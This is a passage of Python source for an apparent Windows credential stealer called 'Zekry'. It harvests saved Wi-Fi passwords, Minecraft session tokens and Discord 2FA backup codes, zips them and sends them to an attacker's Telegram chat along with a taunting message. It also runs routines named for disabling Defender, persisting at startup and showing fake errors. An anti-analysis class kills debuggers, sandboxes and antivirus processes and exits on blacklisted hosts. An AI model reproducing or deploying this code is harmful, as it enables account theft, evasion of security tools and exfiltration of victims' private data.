        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update,
                                             '--processStart',
                                             executable],
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)

class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        os.makedirs(os.path.join(tempfolder, "Wifi"), exist_ok=True)

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github} | Wifi Networks & Passwords\n\n")

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
            else:
                with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
                    f.write('There is no wireless interface on the system. Ethernet using twat.')
                f.close()

        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key

        with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')

class Minecraft:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
        self.usercache_path = "\\.minecraft\\usercache.json"
        self.error_message = "No minecraft accounts or access tokens :("

        os.makedirs(os.path.join(tempfolder, "Minecraft"), exist_ok=True)
        self.session_info()
        self.user_cache()

    def session_info(self):
        with open(os.path.join(tempfolder, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github} | Minecraft Session Info\n\n")
            if os.path.exists(self.roaming + self.accounts_path):
                with open(self.roaming + self.accounts_path, "r") as g:
                    self.session = json.load(g)
                    f.write(json.dumps(self.session, indent=4))
            else:
                f.write(self.error_message)

    def user_cache(self):
        with open(os.path.join(tempfolder, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            f.write(f"{github} | Minecraft User Cache\n\n")
            if os.path.exists(self.roaming + self.usercache_path):
                with open(self.roaming + self.usercache_path, "r") as g:
                    self.user = json.load(g)
                    f.write(json.dumps(self.user, indent=4))
            else:
                f.write(self.error_message)

class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'

        os.makedirs(os.path.join(tempfolder, "Discord"), exist_ok=True)
        self.get_codes()

    def get_codes(self):
        with open(os.path.join(tempfolder, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
            f.write(f"{github} | Discord Backup Codes\n\n")
            if os.path.exists(self.path + self.code_path):
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            else:
                f.write("No discord backup codes found")

def zipup():
    global localappdata
    localappdata = os.getenv('LOCALAPPDATA')

    _zipfile = os.path.join(localappdata, f'ZEKRY-{os.getlogin()}.zip')
    zipped_file = ZipFile(_zipfile, "w", ZIP_DEFLATED)
    abs_src = os.path.abspath(tempfolder)
    for dirname, _, files in os.walk(tempfolder):
        for filename in files:
            absname = os.path.abspath(os.path.join(dirname, filename))
            arcname = absname[len(abs_src) + 1:]
            zipped_file.write(absname, arcname)
    zipped_file.close()

def main(token: str, chat_id: str):
    telegram = Telegram(token)

    threads = [Browsers, killprotector, fakeerror, startup, disable_defender, Wifi, Minecraft, BackupCodes]
    configcheck(threads)

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    zipup()

    telegram.send_message(chat_id=chat_id, text="<b>Mais um Otario caiu 😜😜😜😜🤣🤣🤣</b>")
    _file = telegram.send_file(chat_id=chat_id, filepath=f'{localappdata}\\ZEKRY-{os.getlogin()}.zip')
    time.sleep(0.5)

    PcInfo_telegram(token, chat_id)
    Discord()

def Zekry(token: str, chat_id: str):
    Debug()
    procs = [main, Injection]
    for proc in procs:
        proc(token, chat_id)

class Debug:
    global tempfolder, ip, mac, hwid, github
    tempfolder = mkdtemp()
    github = "https://github.com/pedrorichil"

    def __init__(self):
        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = [
            'WDAGUtilityAccount', 'Abby', 'Bruno', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
            'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise',
            'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-DSMEVVL', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00',
            '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57',
            'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
            'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6', '7C857124-800A-4BFA-B3EB-85AC214D3568']
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107', '34.27.136.142']
        self.blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e', '80:65:83:4f:2b:03']
        self.blacklistedProcesses = [
            "ollydbg", "ida", "ida64", "ida32", "idag", "idaw", "idau", "scylla", "scylla_x64", "scylla_x86",
            "protection_id", "x64dbg", "x96dbg", "x32dbg", "windbg", "reshacker", "pe-bear",
            "pestudio", "exeinfope", "die", "detectiteasy", "procmon", "procexp", "processhacker", "sysinternals",
            "wireshark", "fiddler", "httpdebuggerui", "tcpview", "netsniff-ng", "netmon", "mitmproxy",
            "cmd", "powershell", "regedit", "taskmgr", "services", "msconfig", "eventvwr",
            "vboxservice", "vboxtray", "virtualbox", "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
            "vmsrvc", "vmusrvc", "qemu-ga", "qemu-system", "xenservice", "xenstored", "xenconsoled", "vmmouse", "vboxmouse",
            "prl_cc", "prl_tools", "prl_service", "parallels", "hyperv", "hypervisor", "hvix64", "hvax64", "vbox", "vmware",
            "joeboxcontrol", "joeboxserver", "cuckoo", "cuckoomon", "cuckoo-modified", "any.run", "sandboxie", "bhyve",
            "pafish", "malwr", "threatgrid", "cisco-amp", "anubis", "comodo", "avg", "avast", "symantec", "avira", "kaspersky",
            "ksdumper", "ksdumperclient", "cheatengine", "extremedumper", "megadumper", "hxd", "imhex", "gdb", "radare2",
            "VBoxGuest", "VBoxService", "vmtoolsd", "vmwaretray", "vmsrvc", "vmusrvc", "qemu-ga", "prl_cc", "prl_tools",
            "XenSvc", "xenservice", "vboxservice", "vboxtray", "vboxmouse",
            "debug", "monitor", "trace", "hook", "inject", "dump", "sniff", "reverse", "sandbox", "emulator",
            argv[0]
        ]

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True
        return debugging

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        if sys.gettrace():
            sys.exit(0)

    def get_network(self) -> bool:
        global ip, mac, github
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        github = "https://github.com/pedrorichil"
        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True
        return False

    def get_system(self) -> bool:
        global hwid, username, hostname
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        if hwid in self.blackListedHWIDS:
            return True
        if username in self.blackListedUsers:
            return True
        if hostname in self.blackListedPCNames:
            return True
        return False

    def self_destruct(self) -> None:
        exit()

if __name__ == '__main__' and os.name == "nt":
    Zekry(__TOKEN__, __CHAT_ID__)



























